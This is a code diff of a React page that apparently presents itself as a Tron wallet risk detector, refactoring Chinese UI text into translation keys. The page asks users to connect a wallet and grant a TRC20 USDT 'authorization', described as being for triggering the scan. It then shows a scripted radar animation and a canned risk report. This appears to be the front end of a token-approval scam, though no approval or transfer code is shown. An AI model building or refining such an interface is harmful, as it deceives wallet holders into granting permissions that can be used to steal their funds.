+                    <p className="mt-2 font-display text-lg text-foreground">{formatAmount(wallet.trxBalance, locale)} TRX</p>
+                    <p className="mt-2 text-xs subtle-copy">{formatAmount(wallet.usdtBalance, locale)} USDT</p>
                   </div>
                 </div>
               )}
 
               <div className="rounded-2xl border border-border bg-background/40 p-4">
                 <div className="flex items-center gap-2 text-sm text-foreground">
-                  {(stage === "authorizing" || stage === "scanning" || isConnecting) && (
-                    <LoaderCircle className="h-4 w-4 animate-spin text-primary" />
-                  )}
-                  <span>{helperText}</span>
+                  {(stage === "authorizing" || stage === "scanning" || isConnecting) && <LoaderCircle className="h-4 w-4 animate-spin text-primary" />}
+                  <span>{t(helperText.key, helperText.values)}</span>
                 </div>
                 {error && (
                   <div className="mt-3 rounded-2xl border border-danger-soft bg-danger-soft px-3 py-2 text-sm text-danger">
-                    {error}
+                    {t(error.key, error.values)}
                   </div>
                 )}
               </div>
@@ -966,10 +911,8 @@ const Index = () => {
                             <Wallet className="h-5 w-5" />
                           </div>
                           <div className="space-y-2">
-                            <p className="font-display text-lg text-foreground">连接 Tron 钱包</p>
-                            <p className="text-sm leading-6 subtle-copy">
-                              连接后展示钱包地址与余额，并在授权后自动进入多维链上分析流程。
-                            </p>
+                            <p className="font-display text-lg text-foreground">{t("detector.connectCard.title")}</p>
+                            <p className="text-sm leading-6 subtle-copy">{t("detector.connectCard.description")}</p>
                           </div>
                         </div>
                       </div>
@@ -977,14 +920,14 @@ const Index = () => {
                       <div className="grid gap-3">
                         {!wallet ? (
                           <Button className="tron-primary-button h-12 rounded-2xl text-base" onClick={connectWallet} disabled={isConnecting}>
-                            {isConnecting ? "连接中..." : "连接钱包"}
+                            {isConnecting ? t("detector.connectCard.connecting") : t("detector.connectCard.connect")}
                           </Button>
                         ) : (
                           <Button className="tron-primary-button h-12 rounded-2xl text-base" onClick={startAuthorization}>
-                            授权并开始检测
+                            {t("detector.connectCard.authorize")}
                           </Button>
                         )}
-                        <p className="text-center text-xs subtle-copy">授权用途：用于触发检测流程与链上风控分析反馈。</p>
+                        <p className="text-center text-xs subtle-copy">{t("detector.connectCard.authorizationHint")}</p>
                       </div>
                     </div>
                   )}
@@ -995,8 +938,8 @@ const Index = () => {
                         <div className="flex items-center gap-3">
                           <LoaderCircle className="h-5 w-5 animate-spin text-primary" />
                           <div>
-                            <p className="font-display text-lg text-foreground">授权中</p>
-                            <p className="text-sm subtle-copy">TRC20 USDT 授权反馈处理中，请稍候。</p>
+                            <p className="font-display text-lg text-foreground">{t("detector.authorizing.title")}</p>
+                            <p className="text-sm subtle-copy">{t("detector.authorizing.description")}</p>
                           </div>
                         </div>
                       </div>
@@ -1010,9 +953,9 @@ const Index = () => {
                     <div className="space-y-5">
                       <RadarAnimation />
                       <div className="space-y-3 text-center">
-                        <p className="font-display text-2xl tron-text-glow">高级链上分析进行中</p>
+                        <p className="font-display text-2xl tron-text-glow">{t("detector.scanning.title")}</p>
                         <p aria-live="polite" className="text-sm subtle-copy">
-                          {SCAN_MESSAGES[scanStep]}
+                          {scanMessages[scanStep]}
                         </p>
                         <div className="meter-track">
                           <div className="meter-fill risk" style={{ width: `${38 + scanStep * 18}%` }} />
@@ -1027,33 +970,27 @@ const Index = () => {
                         <div className="flex items-start gap-4">
                           <div
                             className={`rounded-2xl border p-3 ${
-                              stage === "safe"
-                                ? "border-success-soft bg-success-soft text-success"
-                                : "border-danger-soft bg-danger-soft text-danger"
+                              stage === "safe" ? "border-success-soft bg-success-soft text-success" : "border-danger-soft bg-danger-soft text-danger"
                             }`}
                           >
                             {stage === "safe" ? <ShieldCheck className="h-7 w-7" /> : <ShieldAlert className="h-7 w-7" />}
                           </div>
                           <div className="space-y-2">
-                            <p className="font-display text-2xl text-foreground">{report.title}</p>
-                            <p className="text-sm leading-6 subtle-copy">{report.subtitle}</p>
+                            <p className="font-display text-2xl text-foreground">{t(report.titleKey)}</p>
+                            <p className="text-sm leading-6 subtle-copy">{t(report.subtitleKey)}</p>
                           </div>
                         </div>
 
                         <div className="mt-5 grid grid-cols-2 gap-3">
                           {report.metrics.map((metric) => (
-                            <div key={metric.label} className="metric-chip">
-                              <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{metric.label}</p>
+                            <div key={metric.labelKey} className="metric-chip">
+                              <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t(metric.labelKey)}</p>
                               <p
                                 className={`mt-2 font-display text-lg ${
-                                  metric.tone === "safe"
-                                    ? "text-success"
-                                    : metric.tone === "risk"
-                                      ? "text-danger"
-                                      : "text-foreground"
+                                  metric.tone === "safe" ? "text-success" : metric.tone === "risk" ? "text-danger" : "text-foreground"
                                 }`}
                               >
-                                {metric.value}
+                                {t(metric.valueKey)}
                               </p>
                             </div>
                           ))}
@@ -1061,7 +998,7 @@ const Index = () => {
 
                         <div className="mt-5 space-y-2">
                           <div className="flex items-center justify-between text-sm">
-                            <span className="subtle-copy">综合风险评分</span>
+                            <span className="subtle-copy">{t("report.scoreLabel")}</span>
                             <span className="font-display text-foreground">{report.score}/100</span>
                           </div>
                           <div className="meter-track">
@@ -1072,7 +1009,7 @@ const Index = () => {
 
                       <div className="space-y-3">
                         {report.findings.map((finding) => (
-                          <div key={finding.title} className="rounded-[1.25rem] border border-border bg-card/60 p-4">
+                          <div key={finding.titleKey} className="rounded-[1.25rem] border border-border bg-card/60 p-4">
                             <div className="flex items-start gap-3">
                               {stage === "safe" ? (
                                 <CheckCircle2 className="mt-0.5 h-5 w-5 text-success" />
@@ -1080,8 +1017,8 @@ const Index = () => {
                                 <BadgeAlert className="mt-0.5 h-5 w-5 text-danger" />
                               )}
                               <div>
-                                <p className="font-display text-base text-foreground">{finding.title}</p>
-                                <p className="mt-1 text-sm leading-6 subtle-copy">{finding.description}</p>
+                                <p className="font-display text-base text-foreground">{t(finding.titleKey)}</p>
+                                <p className="mt-1 text-sm leading-6 subtle-copy">{t(finding.descriptionKey)}</p>
                               </div>
                             </div>
                           </div>
@@ -1089,12 +1026,12 @@ const Index = () => {
                       </div>
 
                       <div className="rounded-[1.5rem] border border-border bg-background/50 p-4">
-                        <p className="font-display text-base text-foreground">建议操作</p>
+                        <p className="font-display text-base text-foreground">{t("report.actionsTitle")}</p>
                         <ul className="mt-3 space-y-2 text-sm subtle-copy">
-                          {report.recommendations.map((item) => (
+                          {report.recommendationKeys.map((item) => (
                             <li key={item} className="flex items-center gap-2">
                               <span className="info-dot" />
-                              <span>{item}</span>
+                              <span>{t(item)}</span>
                             </li>
                           ))}
                         </ul>
@@ -1103,22 +1040,30 @@ const Index = () => {
                       <div className="grid grid-cols-2 gap-3">
                         <Button className="tron-outline-button h-12 rounded-2xl" variant="outline" onClick={resetToHome}>
                           <RefreshCcw className="h-4 w-4" />
-                          {stage === "safe" ? "重新检测" : "返回首页"}
+                          {stage === "safe" ? t("report.retryScan") : t("report.backHome")}
                         </Button>
                         <Button className="tron-primary-button h-12 rounded-2xl" onClick={() => setShowDetails((prev) => !prev)}>
-                          {showDetails ? "收起报告" : stage === "safe" ? "查看详细报告" : "查看详细分析"}
+                          {showDetails ? t("report.collapseReport") : stage === "safe" ? t("report.viewDetailedReport") : t("report.viewDetailedAnalysis")}
                         </Button>
                       </div>
 
                       {showDetails && (
                         <div className="rounded-[1.5rem] border border-border bg-card/60 p-4">
-                          <p className="font-display text-base text-foreground">详细分析摘要</p>
+                          <p className="font-display text-base text-foreground">{t("report.detailedSummary")}</p>
                           <div className="glass-divider my-4" />
                           <div className="space-y-3 text-sm subtle-copy">
-                            <p>检测引擎：{report.engine}</p>
-                            <p>地址：{wallet ? wallet.address : "-"}</p>
-                            <p>USDT 合约：{USDT_CONTRACT}</p>
-                            <p>结论：系统已完成资金来源、行为模式、关联网络与风险标签交叉评估。</p>
+                            <p>
+                              {t("report.engineLabel")}: {report.engine}
+                            </p>
+                            <p>
+                              {t("report.addressLabel")}: {wallet ? wallet.address : "-"}
+                            </p>
+                            <p>
+                              {t("report.contractLabel")}: {USDT_CONTRACT}
+                            </p>
+                            <p>
+                              {t("report.conclusionLabel")}: {t("report.conclusionText")}
+                            </p>
                           </div>
                         </div>
                       )}
